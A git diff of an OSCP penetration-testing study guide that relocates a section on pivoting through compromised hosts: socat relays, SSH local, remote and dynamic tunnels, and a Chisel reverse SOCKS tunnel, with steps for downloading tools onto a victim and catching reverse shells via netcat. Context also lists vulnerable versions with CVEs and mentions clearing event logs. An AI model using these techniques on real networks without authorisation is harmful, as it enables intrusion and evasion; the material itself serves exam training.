@@ -4,6 +4,7 @@
 - [File transfer](#file-transfer)
 - [Remote to other machines](#remote-to-other-machines)
 - [Ports scan](#ports-scan)
+- [Port tunneling and port redirection](#port-tunneling-and-port-redirection)
 - [OSCP Pro tips](#oscp-pro-tips)
 - [Recommended OSCP Cracking Tools & Usage (2025)](#recommended-oscp-cracking-tools-&-usage-(2025))
 
@@ -255,6 +256,41 @@
 - Combined TCP & UDP  
   `nmap -sS -sU --top-ports 100 -oN top_tcp_udp.txt <IP>`
 
+# Port tunneling and port redirection 
+<img src="https://github.com/xasyhack/oscp2025/blob/main/images/port%20forward%20and%20tunneling.png" alt="" width="400"/>  
+
+**Option 1: Port Redirection using socat (Simple)**  
+Pivot machine A: socat TCP-LISTEN:8888,fork TCP:172.16.10.10:80  
+Kali: curl http://10.10.10.5:8888  
+
+**Option 2: SSH Tunneling - Local Forwarding (if SSH access on A)**  
+kali: ssh -L 8888:172.16.10.10:80 user@10.10.10.5  
+kali: curl http://localhost:8888  
+
+**Option 3: Dynamic Proxy via SSH (SOCKS5)**  
+kali: ssh -D 9050 user@10.10.10.5  
+Edit /etc/proxychains.conf: socks5  127.0.0.1 9050  
+kali: proxychains nmap -Pn -sT -p80 172.16.10.10  
+
+| **Concept**                      | **You Want To...**                              | **Scenario**                                                                 | **Technique**                | **Command Example**                                                                                                                                       | **Notes**                                                                                  |
+|----------------------------------|--------------------------------------------------|------------------------------------------------------------------------------|------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------|
+| **Port Redirection using socat** | Access internal RDP/web from pivot host         | You compromised `10.10.10.5`, want to reach `172.16.5.10:3389` (RDP)         | socat TCP Port Forward       | `socat TCP-LISTEN:3389,fork TCP:172.16.5.10:3389` *(on pivot)*<br>`rdesktop 10.10.10.5:3389` *(on Kali)*                                                  | No encryption; simple TCP relay                                                            |
+| **SSH Local Port Forwarding**    | Access internal web via tunnel                  | You have SSH on `10.10.10.5`, want to view `172.16.5.10:80`                  | `ssh -L` (local forward)     | `ssh -L 8888:172.16.5.10:80 user@10.10.10.5`<br>`curl http://localhost:8888` *(on Kali)*                                                                   | Great for web/DB services                                                                 |
+| **SSH Remote Port Forwarding**   | Let victim connect back to you                 | Firewall blocks reverse shell directly, but allows SSH outbound              | `ssh -R` (reverse tunnel)    | `ssh -R 4444:localhost:4444 kali@your.kali.ip` *(on pivot)*<br>`nc -lvnp 4444` *(on Kali)*                                                                 | Good for shells from behind firewalls                                                      |
+| **SSH Dynamic Proxy**            | Proxy tools through pivot host                 | You want to scan or browse internal network via `10.10.10.5`                | `ssh -D` (SOCKS5 Proxy)      | `ssh -D 9050 user@10.10.10.5` *(on Kali)*<br>Set `proxychains.conf`: `socks5 127.0.0.1 9050`<br>`proxychains nmap -Pn -sT 172.16.5.10`                    | Enables `proxychains`, Gobuster, browsers                                                  |
+| **Chisel (Reverse Tunnel)**      | Pivot without SSH, e.g., Windows box           | Compromised host runs Chisel reverse client to you                          | Chisel SOCKS over reverse    | `chisel server -p 8000 --reverse` *(on Kali)*<br>`chisel client yourip:8000 R:1080:socks` *(on pivot)*                                                    | Useful on Windows without SSH                                                              |
+| **iptables NAT (Linux pivot)**   | Route traffic via Linux box without tools      | You have root on a Linux pivot with `iptables`                              | Linux NAT Port Forward       | `iptables -t nat -A PREROUTING -p tcp --dport 3333 -j DNAT --to-destination 172.16.5.10:80` *(on pivot)*<br>`curl http://10.10.10.5:3333` *(on Kali)*     | Native but less flexible; requires root                                                    |
+
+| **Step** | **Action**                          | **Command**                                                                                      | **Run on**        |
+|----------|--------------------------------------|--------------------------------------------------------------------------------------------------|-------------------|
+| 1        | Prepare Chisel binaries              | `wget ... && gunzip ... && chmod +x ...` (see full commands below)                              | Kali              |
+| 2        | Start HTTP server to serve files     | `python3 -m http.server 80`                                                                      | Kali              |
+| 3        | Download Chisel binary               | `wget http://<kali-ip>/chisel.elf` or PowerShell `Invoke-WebRequest`                            | Victim            |
+| 4        | Start Chisel server (reverse mode)   | `./chisel.elf server -p 8000 --reverse`                                                          | Kali              |
+| 5        | Start Chisel client (reverse tunnel) | `./chisel.elf client <kali-ip>:8000 R:1080:socks` <br> or `chisel.exe ...`                      | Victim            |
+| 6        | Configure proxychains                 | Add `socks5 127.0.0.1 1080` in `/etc/proxychains.conf`                                           | Kali              |
+| 7        | Use proxychains to access internal   | `proxychains nmap -Pn -sT -p80 172.16.10.10` <br> `proxychains curl http://172.16.10.10`         | Kali              |
+
 # OSCP Pro Tips
 | Tip Category       | Tip |
 |--------------------|-----|
@@ -340,44 +376,8 @@
 | `keepnote`        | Note organization                     | GUI |
 | `rm`, `Clear-EventLog` | Clean traces (if allowed)        | Manual cleanup |
 
-# Port tunneling and port redirection 
-<img src="https://github.com/xasyhack/oscp2025/blob/main/images/port%20forward%20and%20tunneling.png" alt="" width="400"/>  
-
-**Option 1: Port Redirection using socat (Simple)**  
-Pivot machine A: socat TCP-LISTEN:8888,fork TCP:172.16.10.10:80  
-Kali: curl http://10.10.10.5:8888  
-
-**Option 2: SSH Tunneling - Local Forwarding (if SSH access on A)**  
-kali: ssh -L 8888:172.16.10.10:80 user@10.10.10.5  
-kali: curl http://localhost:8888  
-
-**Option 3: Dynamic Proxy via SSH (SOCKS5)**  
-kali: ssh -D 9050 user@10.10.10.5  
-Edit /etc/proxychains.conf: socks5  127.0.0.1 9050  
-kali: proxychains nmap -Pn -sT -p80 172.16.10.10  
-
-| **Concept**                      | **You Want To...**                              | **Scenario**                                                                 | **Technique**                | **Command Example**                                                                                                                                       | **Notes**                                                                                  |
-|----------------------------------|--------------------------------------------------|------------------------------------------------------------------------------|------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------|
-| **Port Redirection using socat** | Access internal RDP/web from pivot host         | You compromised `10.10.10.5`, want to reach `172.16.5.10:3389` (RDP)         | socat TCP Port Forward       | `socat TCP-LISTEN:3389,fork TCP:172.16.5.10:3389` *(on pivot)*<br>`rdesktop 10.10.10.5:3389` *(on Kali)*                                                  | No encryption; simple TCP relay                                                            |
-| **SSH Local Port Forwarding**    | Access internal web via tunnel                  | You have SSH on `10.10.10.5`, want to view `172.16.5.10:80`                  | `ssh -L` (local forward)     | `ssh -L 8888:172.16.5.10:80 user@10.10.10.5`<br>`curl http://localhost:8888` *(on Kali)*                                                                   | Great for web/DB services                                                                 |
-| **SSH Remote Port Forwarding**   | Let victim connect back to you                 | Firewall blocks reverse shell directly, but allows SSH outbound              | `ssh -R` (reverse tunnel)    | `ssh -R 4444:localhost:4444 kali@your.kali.ip` *(on pivot)*<br>`nc -lvnp 4444` *(on Kali)*                                                                 | Good for shells from behind firewalls                                                      |
-| **SSH Dynamic Proxy**            | Proxy tools through pivot host                 | You want to scan or browse internal network via `10.10.10.5`                | `ssh -D` (SOCKS5 Proxy)      | `ssh -D 9050 user@10.10.10.5` *(on Kali)*<br>Set `proxychains.conf`: `socks5 127.0.0.1 9050`<br>`proxychains nmap -Pn -sT 172.16.5.10`                    | Enables `proxychains`, Gobuster, browsers                                                  |
-| **Chisel (Reverse Tunnel)**      | Pivot without SSH, e.g., Windows box           | Compromised host runs Chisel reverse client to you                          | Chisel SOCKS over reverse    | `chisel server -p 8000 --reverse` *(on Kali)*<br>`chisel client yourip:8000 R:1080:socks` *(on pivot)*                                                    | Useful on Windows without SSH                                                              |
-| **iptables NAT (Linux pivot)**   | Route traffic via Linux box without tools      | You have root on a Linux pivot with `iptables`                              | Linux NAT Port Forward       | `iptables -t nat -A PREROUTING -p tcp --dport 3333 -j DNAT --to-destination 172.16.5.10:80` *(on pivot)*<br>`curl http://10.10.10.5:3333` *(on Kali)*     | Native but less flexible; requires root                                                    |
-
-| **Step** | **Action**                          | **Command**                                                                                      | **Run on**        |
-|----------|--------------------------------------|--------------------------------------------------------------------------------------------------|-------------------|
-| 1        | Prepare Chisel binaries              | `wget ... && gunzip ... && chmod +x ...` (see full commands below)                              | Kali              |
-| 2        | Start HTTP server to serve files     | `python3 -m http.server 80`                                                                      | Kali              |
-| 3        | Download Chisel binary               | `wget http://<kali-ip>/chisel.elf` or PowerShell `Invoke-WebRequest`                            | Victim            |
-| 4        | Start Chisel server (reverse mode)   | `./chisel.elf server -p 8000 --reverse`                                                          | Kali              |
-| 5        | Start Chisel client (reverse tunnel) | `./chisel.elf client <kali-ip>:8000 R:1080:socks` <br> or `chisel.exe ...`                      | Victim            |
-| 6        | Configure proxychains                 | Add `socks5 127.0.0.1 1080` in `/etc/proxychains.conf`                                           | Kali              |
-| 7        | Use proxychains to access internal   | `proxychains nmap -Pn -sT -p80 172.16.10.10` <br> `proxychains curl http://172.16.10.10`         | Kali              |
-
 # OSCP Vulnerable Software Versions
 **Remote Exploits / Service Exploits**
-
 | Software          | Vulnerable Version(s) | Exploit / CVE                           |
 |------------------|------------------------|-----------------------------------------|
 | Apache Tomcat    | 7.x < 7.0.81           | CVE-2017-12615 (PUT upload RCE)         |
@@ -402,7 +402,6 @@ kali: proxychains nmap -Pn -sT -p80 172.16.10.10
 | DotNetNuke (DNN) | < 9.2                  | CVE-2017-9822 (Install RCE)             |
 
 **Local Privilege Escalation**
-
 | OS / Software     | Vulnerable Version(s) | Exploit / CVE                       |
 |------------------|------------------------|-------------------------------------|
 | Linux Kernel      | 2.6.32 – 4.4.x         | CVE-2016-5195 (DirtyCow)            |
